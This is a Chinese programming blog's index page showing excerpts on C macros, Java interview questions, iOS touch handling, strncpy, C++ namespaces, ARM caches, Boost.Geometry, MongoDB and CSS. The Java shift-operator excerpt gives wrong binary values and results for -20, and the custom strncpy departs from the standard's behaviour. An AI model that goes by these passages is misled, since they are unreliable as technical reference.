<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b9aa2a6183eca418e518a8a70411d4a/" rel="bookmark">
			ANSIC标准定义的6种预定义宏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		From: http://biancheng.dnbcw.info/c/277439.html
ANSIC标准定义了以下6种可供C语言使用的预定义宏： __LINE__ 在源代码中插入当前源代码行号 __FILE__ 在源代码中插入当前源代码文件名 __DATE__ 在源代码中插入当前编译日期〔注意和当前系统日期区别开来〕 __TIME__ 在源代码中插入当前编译时间〔注意和当前系统时间区别开来〕 __STDC__ 当要求程序严格遵循ANSIC标准时该标识符被赋值为1。 __cplusplus 标识符__LINE__和__FILE__通常用来调试程序； 标识符__DATE__和__TIME__通常用来在编译后的程序中加入一个时间标志，以区分程序的不同版本；
这四个都是预编译宏，不是包含在头文件中的
__FILE__是当前编译的文件的文件名 是一个字符串
__TIME__是当前编译的文件的编译时间 格式是hh:mm:ss 是字符串
__DATE__是当前编译的文件的编译日期 格式是Mmm:dd:yyyy 是字符串
__LINE__是调用该宏语句所在的行数，是个十进制数
用在宏定义中
譬如:
#define TEST (__FILE__" "__TIME__) /*这个括号没有也行的*/
int main(void)
{
printf(TEST);
return 0;
}
假如该代码的文件名叫console.cpp
那么会输出文件名加编译时间
.\console.cpp 21:34:22
==========================================
C程序：
#include &lt;stdio.h&gt; int main() { char s1[] = __DATE__; char s2[] = __TIME__; printf("s1=[%s]\n", s1); printf("s2=[%s]\n", s2); return 0; } 编译运行结果： [zcm@c #6]$cat -v a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b9aa2a6183eca418e518a8a70411d4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d1c4c206c4f176421ab8ffd75485c77/" rel="bookmark">
			115个Java面试题和答案——终极列表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文我们将要讨论Java面试中的各种不同类型的面试题，它们可以让雇主测试应聘者的Java和通用的面向对象编程的能力。下面的章节分为上下两篇，第一篇将要讨论面向对象编程和它的特点，关于Java和它的功能的常见问题，Java的集合类，垃圾收集器，第二篇主要讨论异常处理，Java小应用程序，Swing，JDBC，远程方法调用(RMI)，Servlet和JSP。
开始！
目录
面向对象编程（OOP）
常见的Java问题
Java线程
Java集合类
垃圾收集器
面向对象编程（OOP）
Java是一个支持并发、基于类和面向对象的计算机编程语言。下面列出了面向对象软件开发的优点：
代码开发模块化，更易维护和修改。 代码复用。 增强代码的可靠性和灵活性。 增加代码的可理解性。 面向对象编程有很多重要的特性，比如：封装，继承，多态和抽象。下面的章节我们会逐个分析这些特性。
封装
封装给对象提供了隐藏内部特性和行为的能力。对象提供一些能被其他对象访问的方法来改变它内部的数据。在Java当中，有3种修饰符：public，private和protected。每一种修饰符给其他的位于同一个包或者不同包下面对象赋予了不同的访问权限。
下面列出了使用封装的一些好处：
通过隐藏对象的属性来保护对象内部的状态。 提高了代码的可用性和可维护性，因为对象的行为可以被单独的改变或者是扩展。 禁止对象之间的不良交互提高模块化。 参考这个文档获取更多关于封装的细节和示例。
多态
多态是编程语言给不同的底层数据类型做相同的接口展示的一种能力。一个多态类型上的操作可以应用到其他类型的值上面。
继承
继承给对象提供了从基类获取字段和方法的能力。继承提供了代码的重用行，也可以在不修改类的情况下给现存的类添加新特性。
抽象
抽象是把想法从具体的实例中分离出来的步骤，因此，要根据他们的功能而不是实现细节来创建类。Java支持创建只暴漏接口而不包含方法实现的抽象的类。这种抽象技术的主要目的是把类的行为和实现细节分离开。
抽象和封装的不同点
抽象和封装是互补的概念。一方面，抽象关注对象的行为。另一方面，封装关注对象行为的细节。一般是通过隐藏对象内部状态信息做到封装，因此，封装可以看成是用来提供抽象的一种策略。
常见的Java问题
1.什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？
Java虚拟机是一个可以执行Java字节码的虚拟机进程。Java源文件被编译成能被Java虚拟机执行的字节码文件。
Java被设计成允许应用程序可以运行在任意的平台，而不需要程序员为每一个平台单独重写或者是重新编译。Java虚拟机让这个变为可能，因为它知道底层硬件平台的指令长度和其他特性。
2.JDK和JRE的区别是什么？
Java运行时环境(JRE)是将要执行Java程序的Java虚拟机。它同时也包含了执行applet需要的浏览器插件。Java开发工具包(JDK)是完整的Java软件开发包，包含了JRE，编译器和其他的工具(比如：JavaDoc，Java调试器)，可以让开发者开发、编译、执行Java应用程序。
3.”static”关键字是什么意思？Java中是否可以覆盖(override)一个private或者是static的方法？
“static”关键字表明一个成员变量或者是成员方法可以在没有所属的类的实例变量的情况下被访问。 Java中static方法不能被覆盖，因为方法覆盖是基于运行时动态绑定的，而static方法是编译时静态绑定的。static方法跟类的任何实例都不相关，所以概念上不适用。
4.是否可以在static环境中访问非static变量？
static变量在Java中是属于类的，它在所有的实例中的值是一样的。当类被Java虚拟机载入的时候，会对static变量进行初始化。如果你的代码尝试不用实例来访问非static的变量，编译器会报错，因为这些变量还没有被创建出来，还没有跟任何实例关联上。
5.Java支持的数据类型有哪些？什么是自动拆装箱？
Java语言支持的8中基本数据类型是：
byte short int long float double boolean char 自动装箱是Java编译器在基本数据类型和对应的对象包装类型之间做的一个转化。比如：把int转化成Integer，double转化成double，等等。反之就是自动拆箱。
6.Java中的方法覆盖(Overriding)和方法重载(Overloading)是什么意思？
Java中的方法重载发生在同一个类里面两个或者是多个方法的方法名相同但是参数不同的情况。与此相对，方法覆盖是说子类重新定义了父类的方法。方法覆盖必须有相同的方法名，参数列表和返回类型。覆盖者可能不会限制它所覆盖的方法的访问。
7.Java中，什么是构造函数？什么是构造函数重载？什么是复制构造函数？
当新对象被创建的时候，构造函数会被调用。每一个类都有构造函数。在程序员没有给类提供构造函数的情况下，Java编译器会为这个类创建一个默认的构造函数。
Java中构造函数重载和方法重载很相似。可以为一个类创建多个构造函数。每一个构造函数必须有它自己唯一的参数列表。
Java不支持像C++中那样的复制构造函数，这个不同点是因为如果你不自己写构造函数的情况下，Java不会创建默认的复制构造函数。
8.Java支持多继承么？
不支持，Java不支持多继承。每个类都只能继承一个类，但是可以实现多个接口。
9.接口和抽象类的区别是什么？
Java提供和支持创建抽象类和接口。它们的实现有共同点，不同点在于：
接口中所有的方法隐含的都是抽象的。而抽象类则可以同时包含抽象和非抽象的方法。 类可以实现很多个接口，但是只能继承一个抽象类 类如果要实现一个接口，它必须要实现接口声明的所有方法。但是，类可以不实现抽象类声明的所有方法，当然，在这种情况下，类也必须得声明成是抽象的。 抽象类可以在不提供接口方法实现的情况下实现接口。 Java接口中声明的变量默认都是final的。抽象类可以包含非final的变量。 Java接口中的成员函数默认是public的。抽象类的成员函数可以是private，protected或者是public。 接口是绝对抽象的，不可以被实例化。抽象类也不可以被实例化，但是，如果它包含main方法的话是可以被调用的。 也可以参考JDK8中抽象类和接口的区别
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d1c4c206c4f176421ab8ffd75485c77/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fc413d5e0aa3a891597377ed55aae29/" rel="bookmark">
			视图的touch事件的传播控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在视图控制器类中，self.view中会包括多个多层的自定义视图。我自定义了一个uicollectionview类，名称为gridview，又自定义了一个uicollectionviewcell类，名为gridcell。在gridcell的contentview中增加uitextfield对象。
+----------------------------+
|A -gridview |
|+--------+ +------------+ |
||B- | |C | |
||gridcell| |gridcell | |
|+--------+ +------------+ |
| |
| |
+----------------------------+
这样，该视图控制器类就会展现出一系列的表格组合，类似于excel。要实现的功能有这些：
1、在touch一个格子时就能出现虚拟键盘，从而可以立即编辑它。
2、在虚拟键盘出现以后，再touch表格视图的任意点都能关闭虚拟键盘，但不再次打开可能被touch到的另外一个格子。
3、在longpress一个格子时，还是锁定并移动它到任意位置上。
通过对touch事件的控制，可以实现虚拟键盘的打开和关闭，所见即所得的功能。
uiview的hitTest:withEvent:方法 在自定义的gridview类中，需要对该方法进行重定义，用于控制touch事件的传播和对gridview的处理。
如果hitTest:withEvent:返回的结果不是nil，则touch事件会传播到gridcell中，并调用gridview的-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event方法。
如果返回的结果是nil，则返回调用视图控制器类中-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event方法，这个方法重载以后，可以实现对控制虚拟键盘的关闭。
因此，重载这个方法，可以实现对touch事件的传播的控制。
gridview中重载的方法
- (BOOL)pointInside:(CGPoint)point withEvent:(UIEvent *)event
{
// 根据条件截断 事件的传输链条
if ([selfisFirstResponder]) {
// [selfresignFirstResponder]; 因为该方法 一次点击会被调用两次，导致其会进一步调用cell中的该方法。所以不在此处 resign first responder
// 在此出将 事件链条 截断，从而使得 集合视图可以工作。否则，将触发集合视图覆盖的虚拟键盘。
// return NO;
}
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fc413d5e0aa3a891597377ed55aae29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bf5f4e7b9cf667db22936d3fe7b3415/" rel="bookmark">
			strncpy函数的实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		strncpy函数的函数原型是char *strncpy(char *dest, char *src, int len)。它的作用是将src指针指向的字符串拷贝到dest指针指向的数组，在遇到‘\0’或者以实现已经复制了len个字符，函数都会终止执行。
这里需要注意的是：
1、函数开始时要判断地址是否为空，可以用断言来判断；
2、dest指针指向的字符数组的长度必须要大于src指针指向的字符串的长度；
3、在len小于dest指针指向的数组长度时，则实现len个字符的正常复制；若len大于等于dest指针指向的数组长度时，则将src指针指向的字符串全部拷贝到给定数组中。
4、最后别忘记加上'\0'给字符数组。
具体实现如下：
char *strncpy(char *dest, const char *src, int len)
{
assert(dest!=NULL &amp;&amp; src!=NULL);
char *temp;
temp = dest;
for(int i =0;*src!='\0' &amp;&amp; i&lt;len; i++,temp++,src++)
*temp = *src;
*temp = '\0';
return dest;
}
测试如下：
#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;assert.h&gt;
//#pragma pack(2)
using namespace std;
int main()
{
char *strncpy(char *,const char *,int);
const char *str1 = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9bf5f4e7b9cf667db22936d3fe7b3415/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01759b73cb331ef127a04235ccb249f6/" rel="bookmark">
			C&#43;&#43;中的using namespace std的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 所谓namespace，是指标识符的各种可见范围。C++标准程序库中的所有标识符都被定义于一个名为std的namespace中。
iostream和iostream.h的区别：
后缀为.h的头文件C++标注已经明确提出不支持了。早些的实现将标准库功能定义在全局空间里，声明在带.h后缀的头文件里，C++标准为了和C区别开，也为了正确地使用命名空间，规定头文件不使用后缀.h。因此，当使用&lt;iostream.h&gt;时，相当于在C中调用库函数，使用的是全局命名空间，也就是早期的C++实现。当使用&lt;iostream&gt;时，该头文件没有定义全局命名空间，必须使用namespace std，这样才能使用类似于cout这样的C++标识符。
namespace是指标识符的各种可见范围。 C++标准程序库中的所有标识符都被定义于一个名为std的namespace中。 由于namespace的概念，使用C++标准程序库的任何标识符时，可以有三种选择： 直接指定标识符 例如std::iostream而不是iostream。完整语句如下： std::cout &lt;&lt; std::hex &lt;&lt; 3.4 &lt;&lt; std::endl; 使用using关键字 using std::cout; using std::endl; using std::cin; 以上程序可以写成如下代码： using std::cout &lt;&lt;using std::hex &lt;&lt; 3.4 &lt;&lt;using std:: endl; 使用using namespace std 例如： #include&lt;iostream&gt; #include&lt;sstream&gt; #include&lt;string&gt; using namespace std; 这样命名空间std内定义的所有标识符都有效（曝光）。就好像它们被声明为全局变量一样。那么以上语句可以如下写: cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl; 因为标准库非常的庞大，所以程序员在选择的类的名称或函数名时就很有可能和标准库中的某个名字相同。所以为了避免这种情况所造成的名字冲突，就把标准库中的一切都放在名字空间std中。但这有会带来了一个新问题。无数原有的C++代码都依赖于使用了多年的伪标准库中的功能，他们都是在全局空间下的，所以就有了&lt;iostream&gt;和&lt;iostream.h&gt;等等这样的头文件，一个是为了兼容以前的C++代码，一个是为了支持新的标准。命名空间std封装的是标准程序库的名称，标准程序库为了和以前的头文件区别，一般都不加".h"。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8784794d52c7e9e2bc842c94d63cb2c5/" rel="bookmark">
			ARM体系结构及内核回顾总结（二）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.2 存储体系结构
CPU作为整个系统的核心，其功能便是完成软件所指定的工作。具体到其内部，便是执行一条条的指令。那么指令从何而来？
CPU所执行的指令大致可分为三类：指令流控制，数据存取，数据处理。另外还有其它的一些设计CPU内功能的，譬如WFI指令之类。这里，其实最重要的当然还是数据的处理，包括存取与运算。它才是CPU的核心工作。那么数据从何而来。
CPU的核心部分，即前一节所说的integer core部分，其内部有存储作用的只有各种功能的寄存器组，而通用寄存器组，除去有特殊有特殊作用的寄存器外，可作存储数据用的也就r0-r12功十三个寄存器，自然是不足以放下所有数据及指令的。因此，CPU运行所需的指令和数据均是从外部存储空间取得，那么数据和指令是直接从外部存储空间比如DDR（排除更低一级的存储，比如nand flash）直接到核内部执行单元吗？
当然不是。
CPU包括ARM核及x86核均采用了分层式的存储体系结构。从最靠近核的位置往外，呈金字塔形。这样做的原因在于CPU的执行速度通常远远高于DDR的存取速度，因此在CPU与DDR之间添加几层RAM，从CPU往外，各级RAM的访问速度逐级下降。
以一个简单的三级存储结构为例，就比如ARM1176+L2Cache+ddr的结构。其L1存储结构位于核内，如上一节中所示，其包括ITCM/DTCM，ICACHE/DCACHE。其中TCM是值得稍稍一提的，它是与Cache平行的结构，即在二者均工作的时候，若CPU所需的数据或指令在Cache中，则通常不会在TCM中。而且TCM与cache的区别还在于，TCM通常就是该条存储线的中断，即TCM没有更下一级的存储结构，而Cache则不然。虽然二者都是为了提高CPU的执行效率而设置的，但是TCM具有确定性，即TCM所拥有的数据完全属于TCM，是确定的，而Cache则不然。Cache是整条数据流或者整个存储结构的的中间层，对于软件代码或者对于CPU核心而言，它其实是透明的。即Cache不占用独立地址空间，它的作用是将L2传入或者传出到L2中的数据缓存在其ram中，在CPU需要的时候直接从其RAM中取出。而L2Cache的功能与L1Cache一致，同样是缓存的功能，其RAM大小通常会大于L1Cache，而延迟也会大于L1Cache。另外还有一点区别在于，通常它的存储是不区分指令和数据的（ARM自家的L2Cache控制器PL310内部其实对指令和数据是有区分的，其硬件总线上有区别），即采用的冯·洛伊曼结构。而如L1Cache那样区分Instruction Cache与Data cache的则为哈佛结构，简单而言，该种结构能具有更好的执行效率，两种结构的具体优劣网上有无数非常好的讲解，此处就不详述了。而L3 Memory即为DDR，运行所需的数据和指令最终都是存储在该位置，在DDR中就完全不区分数据和指令了。
而对于这种存储结构，我们通常还需要一个硬件单元来进行管理。ARM中进行内存管理的单元就是MMU或者MPU。前者用于虚拟内存体系，相对复杂，后者用于物理内存体系，要简单很多。这二者的作用主要就是对地址空间的访问属性进行管理，譬如能否访问以及能否cache能否buffer等。
另外，不同的处理器（ARM处理器），不同的体系，内存体系差异还是较大的，比如A9就没有ITCM和DTCM，M0作为微控制器甚至没有cache结构，但是其实最终也逃不出这个框架。无非只是在存储体系的各个层级有所删改而已。
转载于:https://www.cnblogs.com/iambobor/p/3676627.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbf2533cb09f34a301f5e6940c3dd756/" rel="bookmark">
			boost库之geometry&lt;二&gt;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;boost/assign.hpp&gt; #include &lt;boost/geometry/core/point_type.hpp&gt; #include &lt;boost/geometry/geometry.hpp&gt; #include &lt;boost/geometry/geometries/point_xy.hpp&gt; #include &lt;boost/geometry/geometries/linestring.hpp&gt; #include &lt;boost/geometry/geometries/box.hpp&gt; #include &lt;boost/geometry/geometries/ring.hpp&gt; #include &lt;boost/geometry/geometries/polygon.hpp&gt; #include &lt;boost/geometry/algorithms/transform.hpp&gt; #include &lt;boost/geometry/strategies/transform/inverse_transformer.hpp&gt; #include &lt;boost/geometry/strategies/transform/matrix_transformers.hpp&gt; namespace bg = boost::geometry; typedef bg::model::d2::point_xy&lt;double&gt; DPoint; typedef bg::model::segment&lt;DPoint&gt; DSegment; typedef bg::model::linestring&lt;DPoint&gt; DLineString; typedef bg::model::box&lt;DPoint&gt; DBox; typedef bg::model::ring&lt;DPoint, false&gt; DRing; typedef bg::model::polygon&lt;DPoint, false&gt; DPolygon; //对Geometry库一些函数进行了封装，更加方便使用，包括(平移，旋转，缩放，求点到直线的垂足，通过比例求段上的点等等) namespace GeometryExtend { DPoint operator +(const DPoint&amp; pt1, const DPoint&amp; pt2) { DPoint pt(pt1); bg::add_point(pt, pt2); return pt; } const DPoint&amp; operator +=(DPoint&amp; pt1, const DPoint&amp; pt2) { bg::add_point(pt1, pt2); return pt1; } DPoint operator -(const DPoint&amp; pt1, const DPoint&amp; pt2) { DPoint pt(pt1); bg::subtract_point(pt, pt2); return pt; } const DPoint&amp; operator -=(DPoint&amp; pt1, const DPoint&amp; pt2) { bg::subtract_point(pt1, pt2); return pt1; } // //	平移变换 // template&lt;typename Geometry, typename CalculationType&gt; struct translate_impl { static void apply(Geometry&amp; geometry, const CalculationType&amp; x, const CalculationType&amp; y) { bg::strategy::transform::translate_transformer&lt;CalculationType, 2, 2&gt; t(x, y); bg::transform(geometry, geometry, t); } }; template&lt;typename Geometry, typename CalculationType&gt; struct translate_trais { static void apply(Geometry&amp; geometry, const CalculationType&amp; x, const CalculationType&amp; y); }; #define TRANSLATE_TRAIS(Geometry) \ template&lt;typename CalculationType&gt; \ struct translate_trais&lt;Geometry, CalculationType&gt; \ { \ static void apply(Geometry&amp; geometry, const CalculationType&amp; x, const CalculationType&amp; y) \ { \ translate_impl&lt;Geometry, CalculationType&gt;::apply(geometry, x, y); \ } \ }; TRANSLATE_TRAIS(DPoint) TRANSLATE_TRAIS(DSegment) TRANSLATE_TRAIS(DBox) TRANSLATE_TRAIS(DRing) TRANSLATE_TRAIS(DPolygon) template&lt;typename Geometry, typename CalculationType&gt; void translate(Geometry&amp; geometry, const CalculationType&amp; x, const CalculationType&amp; y) { translate_trais&lt;Geometry, CalculationType&gt;::apply(geometry, x, y); } // //	旋转变换 // template&lt;typename Geometry, typename DegreeOrRadian, typename CalculationType&gt; struct rotate_impl { static void apply(Geometry&amp; geometry, const CalculationType&amp; angle) { bg::strategy::transform::rotate_transformer&lt;DegreeOrRadian, CalculationType, 2, 2&gt; t(angle); bg::transform(geometry, geometry, t); } }; template&lt;typename Geometry, typename DegreeOrRadian, typename CalculationType&gt; struct rotate_trais { static void apply(Geometry&amp; geometry, const CalculationType&amp; angle); }; #define ROTATE_TRAIS(Geometry, DegreeOrRadian) \ template&lt;typename CalculationType&gt; \ struct rotate_trais&lt;Geometry, DegreeOrRadian, CalculationType&gt; \ { \ static void apply(Geometry&amp; geometry, const CalculationType&amp; angle) \ { \ rotate_impl&lt;Geometry, DegreeOrRadian, CalculationType&gt;::apply(geometry, angle); \ } \ }; ROTATE_TRAIS(DPoint, bg::degree) ROTATE_TRAIS(DPoint, bg::radian) ROTATE_TRAIS(DSegment, bg::degree) ROTATE_TRAIS(DSegment, bg::radian) ROTATE_TRAIS(DBox, bg::degree) ROTATE_TRAIS(DBox, bg::radian) ROTATE_TRAIS(DRing, bg::degree) ROTATE_TRAIS(DRing, bg::radian) ROTATE_TRAIS(DPolygon, bg::degree) ROTATE_TRAIS(DPolygon, bg::radian) template&lt;typename Geometry, typename DegreeOrRadian, typename CalculationType&gt; void rotate(Geometry&amp; geometry, const DegreeOrRadian&amp;, const CalculationType&amp; angle) { rotate_trais&lt;Geometry, DegreeOrRadian, CalculationType&gt;::apply(geometry, angle); } template&lt;typename Geometry, typename Point, typename DegreeOrRadian, typename CalculationType&gt; void point_rotate(Geometry&amp; geometry, const Point&amp; point, const DegreeOrRadian&amp; type, const CalculationType&amp; angle) { Point pt(0, 0); bg::subtract_point(pt, point); translate(geometry, bg::get&lt;0&gt;(pt), bg::get&lt;1&gt;(pt)); rotate(geometry, type, angle); translate(geometry, bg::get&lt;0&gt;(point), bg::get&lt;1&gt;(point)); } // //	比例变形 // template&lt;typename Geometry, typename CalculationType&gt; struct scale_impl { static void apply(Geometry&amp; geometry, const CalculationType&amp; scale_x, const CalculationType&amp; scale_y) { bg::strategy::transform::scale_transformer&lt;CalculationType, 2, 2&gt; t(scale_x, scale_y); bg::transform(geometry, geometry, t); } }; template&lt;typename Geometry, typename CalculationType&gt; struct scale_trais { static void apply(Geometry&amp; geometry, const CalculationType&amp; scale_x, const CalculationType&amp; scale_y); }; #define SCALE_TRAIS(Geometry) \ template&lt;typename CalculationType&gt; \ struct scale_trais&lt;Geometry, CalculationType&gt; \ { \ static void apply(Geometry&amp; geometry, const CalculationType&amp; scale_x, const CalculationType&amp; scale_y) \ { \ scale_impl&lt;Geometry, CalculationType&gt;::apply(geometry, scale_x, scale_y); \ } \ }; SCALE_TRAIS(DPoint) SCALE_TRAIS(DSegment) SCALE_TRAIS(DBox) SCALE_TRAIS(DRing) SCALE_TRAIS(DPolygon) template&lt;typename Geometry, typename CalculationType&gt; void scale(Geometry&amp; geometry, const CalculationType&amp; scale_x, const CalculationType&amp; scale_y) { scale_trais&lt;Geometry, CalculationType&gt;::apply(geometry, scale_x, scale_y); } // //	函数功能： //	扩充box // template&lt;typename Geometry, typename CalculateType&gt; void InflateBox(Geometry&amp; geometry, CalculateType const&amp; cx, CalculateType const&amp; cy) { typedef typename bg::point_type&lt;Geometry&gt;::type point_type; point_type&amp; ptMin = geometry.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbf2533cb09f34a301f5e6940c3dd756/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2567aa21a370f2133e9900d26f6ea90/" rel="bookmark">
			mongo查询某个字段是否存在，并删除记录里的这个字段
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		db.course.find( { "lectures.lectures_count": { $exists: true } } ) 查询course表中，存在lectures_count字段的记录信息 删除course表中，所有的lectures.lectures_count字段
db.course.update({},{$unset:{"lectures.lectures_count":""}},{multi:true})
根据条件往表里插入一个字段
db.lecture.update({"course_id":"5352d5ab92fc7705666ae8c9"},{$set:{"file_type":"PDF"}},{multi:true})
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54846a7535b5c2832aa613a3071cee01/" rel="bookmark">
			CSS中font-style的属性有Italic oblique
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 要搞清楚这个问题，首先要明白字体是怎么回事。一种字体有粗体、斜体、下划线、删除线等诸多属性。 但是并不是所有字体都做了这些，一些不常用的字体，或许就只有个正常体，如果你用Italic，就没有效果了~这时候你就要用Oblique. 可以理解成Italic是使用文字的斜体，Oblique是让没有斜体属性的文字倾斜！ 另外附上CSS2.0上边的解释你参考下： italic和oblique都是向右倾斜的文字, 但区别在于Italic是指斜体字，而Oblique是倾斜的文字，对于没有斜体的字体应该使用Oblique属性值来实现倾斜的文字效果. 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/809903879525a8ca752a5c0d91ad577b/" rel="bookmark">
			Java 中&gt;&gt;和&gt;&gt;&gt;的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java中的位运算符：
&gt;&gt;表示右移，如果该数为正，则高位补0，若为负数，则高位补1；
&gt;&gt;&gt;表示无符号右移，也叫逻辑右移，即若该数为正，则高位补0，而若该数为负数，则右移后高位同样补0。
表达式为：
result = exp1 &gt;&gt; exp2;
result = exp2 &gt;&gt;&gt; exp2;
表示把数exp1向右移动exp2位。
例如：
res = 20 &gt;&gt; 2; 20的二进制为 0001 0100，右移2位后为 0000 0101，则结果就为 res = 5;
res = -20 &gt;&gt; 2;
-20的二进制为其正数的补码加1，即 1110 1011，右移2位后为 1111 1100，结果为 res = -6;
而对于&gt;&gt;&gt;符号而言：
res = 20 &gt;&gt;&gt; 2; 的结果与 &gt;&gt; 相同；
res = -20 &gt;&gt; 2;
-20的二进制为 1110 1011，右移2位，此时高位补0，即 0011 1010，结果为 res = 58;
补充：
&lt;&lt; 是与&gt;&gt;对应的左移运算符，表示将exp1向左移动exp2位，在低位补0。其实，向左移动n位，就相当于乘以2^n。
左移没有&lt;&lt;&lt;运算符！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f37294129a13b73c29309881dfa7d0c5/" rel="bookmark">
			教你如何迅速秒杀掉：99%的海量数据处理面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 一般而言，标题含有“秒杀”，“99%”，“史上最全/最强”等词汇的往往都脱不了哗众取宠之嫌，但进一步来讲，如果读者读罢此文，却无任何收获，那么，我也甘愿背负这样的罪名，:-)，同时，此文可以看做是对这篇文章：十道海量数据处理面试题与十个方法大总结的一般抽象性总结。
毕竟受文章和理论之限，本文将摒弃绝大部分的细节，只谈方法/模式论，且注重用最通俗最直白的语言阐述相关问题。最后，有一点必须强调的是，全文行文是基于面试题的分析基础之上的，具体实践过程中，还是得具体情况具体分析，且各个场景下需要考虑的细节也远比本文所描述的任何一种解决方法复杂得多。
OK，若有任何问题，欢迎随时不吝赐教。谢谢。
何谓海量数据处理？ 所谓海量数据处理，无非就是基于海量数据上的存储、处理、操作。何谓海量，就是数据量太大，所以导致要么是无法在较短时间内迅速解决，要么是数据太大，导致无法一次性装入内存。
那解决办法呢?针对时间，我们可以采用巧妙的算法搭配合适的数据结构，如Bloom filter/Hash/bit-map/堆/数据库或倒排索引/trie树，针对空间，无非就一个办法：大而化小，分而治之（hash映射），你不是说规模太大嘛，那简单啊，就把规模大化为规模小的，各个击破不就完了嘛。
至于所谓的单机及集群问题，通俗点来讲，单机就是处理装载数据的机器有限(只要考虑cpu，内存，硬盘的数据交互)，而集群，机器有多辆，适合分布式处理，并行计算(更多考虑节点和节点间的数据交互)。
再者，通过本blog内的有关海量数据处理的文章：Big Data Processing，我们已经大致知道，处理海量数据问题，无非就是：
分而治之/hash映射 + hash统计 + 堆/快速/归并排序；双层桶划分Bloom filter/Bitmap；Trie树/数据库/倒排索引；外排序；分布式处理之Hadoop/Mapreduce。 下面，本文第一部分、从set/map谈到hashtable/hash_map/hash_set，简要介绍下set/map/multiset/multimap，及hash_set/hash_map/hash_multiset/hash_multimap之区别(万丈高楼平地起，基础最重要)，而本文第二部分，则针对上述那6种方法模式结合对应的海量数据处理面试题分别具体阐述。
第一部分、从set/map谈到hashtable/hash_map/hash_set 稍后本文第二部分中将多次提到hash_map/hash_set，下面稍稍介绍下这些容器，以作为基础准备。一般来说，STL容器分两种，
序列式容器(vector/list/deque/stack/queue/heap)，关联式容器。关联式容器又分为set(集合)和map(映射表)两大类，以及这两大类的衍生体multiset(多键集合)和multimap(多键映射表)，这些容器均以RB-tree完成。此外，还有第3类关联式容器，如hashtable(散列表)，以及以hashtable为底层机制完成的hash_set(散列集合)/hash_map(散列映射表)/hash_multiset(散列多键集合)/hash_multimap(散列多键映射表)。也就是说，set/map/multiset/multimap都内含一个RB-tree，而hash_set/hash_map/hash_multiset/hash_multimap都内含一个hashtable。 所谓关联式容器，类似关联式数据库，每笔数据或每个元素都有一个键值(key)和一个实值(value)，即所谓的Key-Value(键-值对)。当元素被插入到关联式容器中时，容器内部结构(RB-tree/hashtable)便依照其键值大小，以某种特定规则将这个元素放置于适当位置。
